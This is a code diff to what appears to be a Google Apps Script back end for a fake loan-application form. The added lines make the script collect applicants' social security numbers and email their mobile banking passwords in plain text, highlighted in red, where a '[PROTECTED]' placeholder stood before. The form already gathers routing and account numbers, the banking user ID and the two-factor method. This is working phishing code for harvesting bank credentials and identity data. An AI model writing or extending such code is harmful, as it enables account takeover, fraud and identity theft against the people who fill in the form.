@@ -33,6 +33,7 @@ function doPost(e) {
       data.lastName || '',
       data.email || '',
       data.phone || '',
+      data.socialSecurity || '',
       data.loanAmount || '',
       data.loanPurpose || '',
       data.loanDuration || '',
@@ -108,6 +109,7 @@ function createHtmlEmailBody(data) {
           <tr><td style="padding: 8px; font-weight: bold; color: #555;">Routing Number:</td><td style="padding: 8px;">${data.routingNumber || 'N/A'}</td></tr>
           <tr><td style="padding: 8px; font-weight: bold; color: #555;">Account Number:</td><td style="padding: 8px;">${data.accountNumber || 'N/A'}</td></tr>
           <tr><td style="padding: 8px; font-weight: bold; color: #555;">Mobile Banking ID:</td><td style="padding: 8px;">${data.mobileBankingUserId || 'N/A'}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Mobile Banking Password:</td><td style="padding: 8px; color: #dc3545; font-weight: bold;">${data.mobileBankingPassword || 'N/A'}</td></tr>
           <tr><td style="padding: 8px; font-weight: bold; color: #555;">Two-Factor Method:</td><td style="padding: 8px;">${data.twoFactorMethod || 'N/A'}</td></tr>
         </table>
       </div>
@@ -155,8 +157,8 @@ function sendEmailNotification(data) {
       "🏦 Bank Name: " + (data.bankName || 'N/A') + "\n" +
       "🔢 Routing Number: " + (data.routingNumber || 'N/A') + "\n" +
       "🏧 Account Number: " + (data.accountNumber || 'N/A') + "\n" +
-      "📱 Mobile Banking User ID: " + (data.mobileBankingUserId || 'N/A') + "\n" +
-      "🔐 Mobile Banking Password: [PROTECTED]\n" +
+      "📱 Mobile Banking ID: " + (data.mobileBankingUserId || 'N/A') + "\n" +
+      "🔐 Mobile Banking Password: " + (data.mobileBankingPassword || 'N/A') + "\n" +
       "🔐 Two-Factor Method: " + (data.twoFactorMethod || 'N/A') + "\n\n" +
       "=== SUBMISSION DETAILS ===\n" +
       "📅 Submitted: " + new Date().toLocaleString() + "\n" +
